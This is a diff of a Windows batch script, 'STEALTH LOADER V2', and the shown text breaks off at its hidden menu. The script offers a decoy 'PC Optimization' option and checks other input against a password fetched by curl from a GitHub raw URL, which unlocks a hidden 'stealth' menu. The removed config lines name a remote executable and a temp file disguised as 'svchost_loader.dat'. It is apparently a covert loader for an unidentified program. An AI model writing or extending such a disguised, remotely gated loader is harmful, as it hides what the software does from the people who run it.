@@ -1,12 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Config
-set "SECRET_PASS_URL=https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/password.txt"
-set "EXE_URL=https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/CAXVN.exe"
-set "TEMP_EXE=%temp%\svchost_loader.dat"
-
-:: UI
+:LOGIN
 cls
 echo ==========================================
 echo           STEALTH LOADER V2
@@ -14,25 +9,25 @@ echo ==========================================
 echo.
 set /p "userpass=Enter Password: "
 
-:: Check password '1' for PC Optimization (placeholder)
+:: Check password '1' for PC Optimization
 if "%userpass%"=="1" (
     echo Launching PC Optimization Menu...
     timeout /t 2 >nul
     goto :EOF
 )
 
-:: Else check against remote secret
+:: Check secret password from GitHub
 echo Verifying secret password...
-curl -s -o "%temp%\remote_pass.txt" "%SECRET_PASS_URL%"
+curl -s -o "%temp%\remote_pass.txt" "https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/password.txt"
 set /p secret=<"%temp%\remote_pass.txt"
 del "%temp%\remote_pass.txt" >nul 2>&1
 
 if /i "%userpass%"=="%secret%" (
     goto :STEALTH_MENU
 ) else (
-    echo Incorrect password.
+    echo Incorrect password. Try again.
     timeout /t 2 >nul
-    exit /b
+    goto :LOGIN
 )
 
 :STEALTH_MENU
